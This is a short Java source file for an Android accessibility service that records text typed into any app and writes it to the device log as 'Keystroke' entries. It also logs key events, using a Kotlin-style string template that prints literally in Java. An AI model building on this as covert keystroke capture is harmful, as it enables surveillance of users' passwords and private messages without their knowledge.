package com.vikasyadavnsit.cdc.services;

import android.accessibilityservice.AccessibilityService;
import android.text.TextUtils;
import android.util.Log;
import android.view.KeyEvent;
import android.view.accessibility.AccessibilityEvent;

import java.util.List;

public class MyAccessibilityService extends AccessibilityService {

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        // Handle accessibility events, such as keystrokes
        if (event.getEventType() == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
            List<CharSequence> textList = event.getText();
            StringBuilder stringBuilder = new StringBuilder();
            for (CharSequence text : textList) {
                stringBuilder.append(text);
            }
            String text = stringBuilder.toString();
            if (!TextUtils.isEmpty(text)) {
                Log.d("Accessibility", "Keystroke: " + text);
            }
        }
    }

    @Override
    public void onServiceConnected() {
        Log.d("Accessibility", "Service connected");
    }

    @Override
    public boolean onKeyEvent(KeyEvent event) {
        Log.i("AccessibilityService", "Key Event Received: ${event?.keyCode}");
        return super.onKeyEvent(event);
    }

    @Override
    public void onInterrupt() {
        // Handle interruption, if necessary
    }
}
